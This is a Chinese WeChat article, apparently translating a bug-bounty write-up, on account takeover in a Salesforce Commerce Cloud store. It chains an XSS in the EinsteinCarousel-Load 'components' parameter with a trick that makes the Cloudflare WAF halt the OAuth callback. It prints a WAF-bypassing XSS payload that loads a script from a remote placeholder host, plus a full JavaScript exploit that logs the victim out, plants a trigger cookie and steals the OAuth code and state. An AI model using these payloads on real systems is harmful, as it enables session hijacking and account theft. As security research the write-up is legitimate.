---
title: 利用 WAF 窃取 Salesforce OAuth 令牌
url: https://mp.weixin.qq.com/s/eKC2GH7qNRWHD9z_xEkqCw
source: Doonsec's feed
date: 2026-01-23
fetch_date: 2026-01-24T03:25:51.546372
---

# 利用 WAF 窃取 Salesforce OAuth 令牌

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Y5LD4fX7WOLTib13VPB8g23MZdN3527HVxBiagOMLfYYmic0O5pC7z1gtbbAibh6wWaJ7vmelAwDdYIXOdEPibt8BJQ/0?wx_fmt=jpeg)

# 利用 WAF 窃取 Salesforce OAuth 令牌

原创

Pwn1
Pwn1

漏洞集萃

![]()

在小说阅读器中沉浸阅读

> **免责声明**
> 本公众号所发布的文章内容仅供学习与交流使用，禁止用于任何非法用途。

|  |
| --- |
| 原文链接  https://castilho.sh/salesforce-oauth-ato |

### 💡 挖掘思路 Tips

> 1. **构造 XSS Payload 绕过 WAF**：利用生僻事件句柄与编码特性。
> 2. **通过 OAuth 实现 ATO**：在 HttpOnly 限制下寻找替代的接管方案。
> 3. **利用 WAF 阻断 Code 和 State**：利用安全机制反向中断业务流程。

---

### 01 漏洞发现与注入点定位

这次测试的目标是一个 **Salesforce** 的实例。由于本身 **Salesforce Commerce Cloud** 提供的比较成熟的安全基线，所以这种这类资产我们再去挖掘常见的代码漏洞几乎是不太可能的了，不过我们可以关注商家自定义的一些设置。**SFRA**（店铺参考架构）控制器 `EinsteinCarousel-Load` 就是一个典型的例子。该控制器允许店铺动态加载轮播图部分的推荐产品，它需要接收两个参数：`limit`（表示轮播图中显示的最大推荐数量）和 `components`（一个 JSON 编码的组件配置对象数组，用于定义轮播图的渲染方式）。

由于 `components` 参数直接控制渲染输出，如果攻击者能够篡改它，它就可能成为一个注入点。通过查看请求包的历史记录，发现了一些使用此控制器的请求，其内容如下所示：

```
GET /on/demandware.store/Sites-Redacted-Site/en/EinsteinCarousel-Load?components=
[{
    "template":"product/productTileCarouselSlide",
    "mainColor":"#000001",
    "model":{
        "type":"product",
        "id":"7919757"
    }
}]
```

服务器将此内容渲染成 HTML 时，通过调整主色 `mainColor` 这个键值，我们可以看到输入的内容反映在渲染后的 HTML 中，作为 `button` 标签内的属性值。经过测试，确认将其更改为 `#000001' x=xy='` 可以成功跳出属性上下文。

```
<button data-border='1px solid #000001' x=x y='' data-background='#000001' x=x y='' class="w-btn w-quantity-btn w-increase-quantity-btn" @click="updateQuantity" :disabled="isMaxQtyReached || !isPriceAvailable || isMaxInventoryReached" aria-label="Increase">
```

---

### 02 构造 Payload 与 WAF 绕过

接下来，我们需要构建一个能够绕过属性上下文执行 JavaScript 的有效 payload。然而，我们还被限制在 `button` 标签内，而 **Cloudflare WAF** 拦截了许多常见的攻击字符。利用 **PortSwigger XSS 速查表** 我们发现 `oncontentvisibilityautostatechange` 还可以用。但是 WAF 还是拦截了 `focus` 和 `style` 这样的关键字，而我们又必须要用这些关键字去构建基于 `oncontentvisibilityautostatechange` 的 payload。

对此，我们可以使用 **Unicode 转义** 去绕过 WAF（如，用 `\u0073` 表示 `s`）。当然了，因为后端使用的是 `JSON.parse()`，所以我们的 payload 可以被正常解析。基于此逻辑，我们可以发送以下 payload 来实现 XSS 攻击，并通过嵌入远端的 js 实现更完善的动作：

```
[{
    "template":"product/productTileCarouselSlide",
    // 利用 Unicode 编码绕过 WAF 对 style 关键字的拦截
    "mainColor":"#000001' oncontentvisibilityautostatechange='document.head.appendChild(document.createElement(`script`)).src=`REMOTE_INSTANCE/analysis.js`' \u0073tyle='display:block;content-visibility:auto",
    "model":{
        "type":"product",
        "id":"7919757"
    }
}]
```

---

### 03 升级攻击：通过 OAuth 实现账户接管 (ATO)

至此算是有了一套比较完备的功能了，那么我们应该考虑下如何扩大影响。我们有哪些选择？窃取会话 `cookie` 是不可能的，因为 Salesforce 强制使用 `HttpOnly` cookie；常见的 Cookie 攻击（例如 **Cookie Jar Overflow**、**Cookie Tossing** 或 **Cookie Sandwich**）也不适用；且由于需要知道受害者当前的密码，因此无法更改其电子邮件地址和密码。

![](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLTib13VPB8g23MZdN3527HVyN1fxfrgmYuJAibhUYKul2VmZIfWSiaOAXQPY5RRxBGt2AvhvsmydMgQ/640?wx_fmt=png&from=appmsg)

不过，有一项功能引起了我的注意，那就是该应用程序允许通过 **Google** 或 **Facebook** 进行 SSO 登录。我们来看一下这个 Salesforce 实例中的流程：首先 `redacted.com` 重定向到 `identity.redacted.com` 以启动登录，身份提供商将浏览器重定向到 Google 进行身份验证。Google 验证后将用户重定向回 IdP 并返回 `code` 和 `state`。IdP 验证结果并通过 `Login-OAuthReentry` 重定向回 `redacted.com`，最终 `Login-OAuthReentry` 兑换 `code` 创建会话。

我们的目标是在身份提供商 (IdP) 重定向回我们的源服务器时拦截 `code` 和 `state` 参数。利用这些值，我们可以获取账户会话并实现账户接管。为此，我们必须在**步骤 5**终止重定向链，因为该 `code` 是**一次性使用**的。

### 04 终极利用：利用 WAF 攻击 WAF

我们的核心思路是利用 **Cloudflare WAF**，通过植入一个“恶意”cookie 来阻止 `Login-OAuthReentry` 回调的重定向。这样可以阻止 `code` 和 `state` 参数被消耗，从而使我们能够通过 XSS 攻击窃取它们。

![](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLTib13VPB8g23MZdN3527HVynkp2cW7X2BCSCV5EibhWcKdhlO1gdNxo8MsEBGGo7GtqX2icglUufJQ/640?wx_fmt=png&from=appmsg)

具体攻击步骤如下：

1. 我们强制受害者注销，并从 `/account/login` HTML 中获取 IdP 的 Google URL。
2. 在受害者的 cookie 罐中添加一个“恶意” `cookie`（例如包含 SQL 注入特征的字符），以便在请求返回到我们的源时触发 WAF 阻止。
3. 通过插入指向 IdP 登录 URL 的 `iframe` 来启动 OAuth 流程。
4. 等待 `iframe` 加载重定向回我们的源页面时，WAF 会拦截请求并返回错误页（包含我们的 XSS），从而中断 302 跳转。
5. 从 `iframe` URL 中窃取未使用的 `code` 和 `state` 参数。

```
(async () => {
    // 1. logout victim
    await fetch('/on/demandware.store/Sites-Redacted-Site/en_US/Login-Logout');

    // 2. get IdP login URL
    const r = await fetch("/account/login").then(r => r.text());
    const p = new DOMParser().parseFromString(r, "text/html");
    const src = p.querySelector("a[data-social-provider='google'][data-idm-redirect]")
        .getAttribute("data-idm-redirect");

    // 3. Set "malicious" cookie to trigger WAF later
    document.cookie="x=' OR 1=1 -- ";

    // 4. start OAuth flow inside iframe
    document.body.innerHTML = `<iframe id="x" src="${src}"></iframe>`;
    const x = document.getElementById("x");
    await new Promise(r => x.onload = r);

    // 5. steal code + state from the blocked URL
    const u = new URL(x.contentWindow.location.href);
    const c = u.searchParams.get("code");
    const s = u.searchParams.get("state");

    console.log("[+] Session Code = " + c);
    console.log("[+] Session state = " + s);
})();
```

**![](https://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLTib13VPB8g23MZdN3527HVTIyMcBicAib35u6lBibu6TPhuqgBiayGLjmibksa6WXj4sib1vCtQCxMLzkg/640?wx_fmt=png&from=appmsg)**

**最后复盘整个攻击链条**：

1、攻击者构造一个包含 XSS Payload 和 WAF 触发器（在 Cookie 中）的恶意 URL。

2、受害者访问后，Salesforce 生成 OAuth `code` 并尝试回调。

3、此时 WAF 检测到 Cookie 中的恶意特征，拦截请求并阻止 302 跳转，返回包含 XSS Payload 的静态报错页。

4、脚本随即在 `iframe` 内执行，读取 `window.location.href`，成功窃取到有效的 `code` 和 `state`。

觉得本文内容对您有启发或帮助？
点个**关注➕**，获取更多深度分析与前沿资讯！

👉 往期精选

[API 渗透实战：从 JSON 响应倒推隐藏的高危路由](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484828&idx=1&sn=376a99fecd6210283cc43c2a79633b26&scene=21#wechat_redirect)

[【从公开报告到私有神器】：如何通过漏洞报告制作字典](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484779&idx=1&sn=5a96dcbe955001b24cfdfb9d3bf4a468&scene=21#wechat_redirect)

[常见OAuth 漏洞：未验证token](https://mp.weixin.qq.com/s?__biz=MzkxNjc0ODA3NQ==&mid=2247484847&idx=1&sn=4873cb78b9422ecaa6579fb0435a5bc0&scene=21#wechat_redirect)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLRgzxswNMosdb4HdiarwSPg43TDHTKMwbX8kaRZ8iajLgxTBVuwFBynCicFAmAvfvapPCydNnZKwgpw/0?wx_fmt=png)

漏洞集萃

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Y5LD4fX7WOLRgzxswNMosdb4HdiarwSPg43TDHTKMwbX8kaRZ8iajLgxTBVuwFBynCicFAmAvfvapPCydNnZKwgpw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过